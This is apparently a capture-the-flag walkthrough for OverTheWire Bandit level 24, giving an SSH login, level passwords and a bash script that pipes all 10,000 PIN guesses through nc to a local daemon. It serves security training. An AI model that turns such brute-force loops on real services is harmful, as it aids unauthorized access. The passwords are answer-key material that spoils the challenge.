# Level 24 → Level 25

## Level Goal
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time

## Solution
```
ssh bandit24@bandit.labs.overthewire.org -p 2220
```
```
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```
```
vim /tmp/myScript.sh
```
Copy & Paste the next script:
```sh
#!/bin/bash

(
for i in {0000..9999}
do
    echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i"
done
) | nc localhost 30002
```
```
chmod +x /tmp/myScript.sh
```
```
/tmp/myScript.sh
```

## Password for the next level
```
p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
```